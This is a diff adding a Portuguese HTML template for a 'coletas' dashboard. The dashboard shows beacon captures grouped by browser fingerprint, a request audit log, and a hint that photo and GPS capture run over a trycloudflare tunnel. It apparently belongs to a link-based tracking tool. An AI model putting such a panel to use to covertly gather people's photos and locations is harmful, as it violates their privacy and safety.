@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="pt-BR" class="ver-root">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Painel · Coletas</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}" />
+</head>
+<body class="ver-body">
+  <div class="noise" aria-hidden="true"></div>
+  <div class="app ver-wrap">
+    <header class="topbar ver-topbar">
+      <div class="brand">
+        <span class="logo" aria-hidden="true"></span>
+        <div>
+          <strong>Painel de coletas</strong>
+          <span class="sub"><code class="ver-code">/</code> ou <code class="ver-code">/ver</code> — atualização automática configurável abaixo</span>
+        </div>
+      </div>
+      <div class="topbar-actions ver-topbar-actions">
+        <span class="pill ver-pill-stat" title="Eventos na auditoria"><span id="ver-status">—</span></span>
+        <span class="pill ver-pill-count" title="Coletas /b agrupadas por dispositivo">
+          <span id="beacon-count">0</span> coleta(s) · <span id="device-groups-count">0</span> disp.
+        </span>
+        <button type="button" class="btn ghost ver-btn-refresh" id="ver-refresh">Atualizar agora</button>
+      </div>
+    </header>
+
+    <div class="ver-toolbar" role="toolbar" aria-label="Controlo do painel">
+      <div class="ver-toolbar-row">
+        <div class="ver-toolbar-group">
+          <label for="ver-interval" class="ver-toolbar-label">Atualizar lista</label>
+          <select id="ver-interval" class="ver-select" aria-describedby="ver-toolbar-tip">
+            <option value="3000" selected>A cada 3 s</option>
+            <option value="8000">A cada 8 s</option>
+            <option value="15000">A cada 15 s</option>
+            <option value="0">Pausar</option>
+          </select>
+        </div>
+      </div>
+      <p id="ver-toolbar-tip" class="ver-toolbar-tip muted">
+        Com o separador em segundo plano, a lista pausa sozinha. Enquanto escreve o nome, clica em Guardar ou tem JSON/UA/diagnóstico aberto dentro de uma captura, a lista <strong>não</strong> é reescrita (evita fechar o que estava a ver). Use <strong>Atualizar agora</strong> para forçar.
+      </p>
+    </div>
+
+    <section class="ver-beacon" aria-labelledby="beacon-title">
+      <div class="ver-section-head">
+        <h2 class="ver-beacon-title" id="beacon-title">Coletas <code class="ver-code">/b</code></h2>
+        <p class="muted ver-hint ver-hint--tight">
+          Coletas são <strong>agrupadas por dispositivo</strong> (impressão leve no navegador). Expanda cada grupo para ver todas as capturas.
+          Foto e GPS precisam de <strong>HTTPS</strong> (túnel trycloudflare).
+        </p>
+      </div>
+      <div class="ver-beacon-grid" id="beacon-cards"></div>
+    </section>
+
+    <section class="ver-audit-section" aria-labelledby="audit-title">
+      <div class="ver-section-head">
+        <h2 class="ver-audit-title" id="audit-title">Linha do tempo · API</h2>
+        <p class="muted ver-hint ver-hint--tight">Resumo dos últimos pedidos; o JSON cru fica em baixo.</p>
+      </div>
+      <div id="audit-summary" class="ver-audit-summary"></div>
+      <details class="ver-raw-wrap">
+        <summary class="ver-raw-summary">Mostrar JSON completo da auditoria</summary>
+        <pre class="code ver-pre" id="ver-out">Carregando…</pre>
+      </details>
+    </section>
+  </div>
+  <script src="{{ url_for('static', filename='ver.js') }}"></script>
+</body>
+</html>
